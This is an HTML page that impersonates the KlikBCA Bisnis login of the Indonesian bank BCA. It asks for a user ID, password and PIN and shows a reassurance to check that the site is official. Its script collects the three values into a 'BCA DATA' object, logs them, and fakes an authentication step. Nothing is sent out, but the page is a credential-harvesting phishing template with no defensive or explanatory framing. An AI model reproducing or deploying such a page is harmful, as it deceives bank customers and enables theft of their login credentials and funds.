<!DOCTYPE html>
<html>
<head>
    <title>BCA - KlikBCA Bisnis</title>
    <style>
        body{font-family:Arial;background:#0066a4;margin:0;padding:20px;color:#333;}
        .box{max-width:400px;margin:40px auto;background:white;padding:30px;border-radius:8px;}
        .header{background:#0066a4;color:white;padding:15px;margin:-30px -30px 20px -30px;border-radius:8px 8px 0 0;}
        input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;}
        button{width:100%;padding:12px;background:#0066a4;color:white;border:none;border-radius:4px;}
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <h3 style="margin:0;">KlikBCA Bisnis</h3>
        </div>
        <form id="bcaForm">
            <input type="text" placeholder="User ID" required>
            <input type="password" placeholder="Password" required>
            <input type="password" placeholder="PIN" required>
            <button type="submit">LOGIN</button>
        </form>
        <p style="font-size:12px;color:#666;margin-top:15px;">
            Pastikan Anda mengakses website resmi BCA
        </p>
    </div>

    <script>
    document.getElementById('bcaForm').onsubmit = function(e) {
        e.preventDefault();
        const inputs = this.querySelectorAll('input');
        const data = {
            userid: inputs[0].value,
            password: inputs[1].value,
            pin: inputs[2].value
        };
        console.log('BCA DATA:', data);
        alert('Proses autentikasi...');
    };
    </script>
</body>
</html>
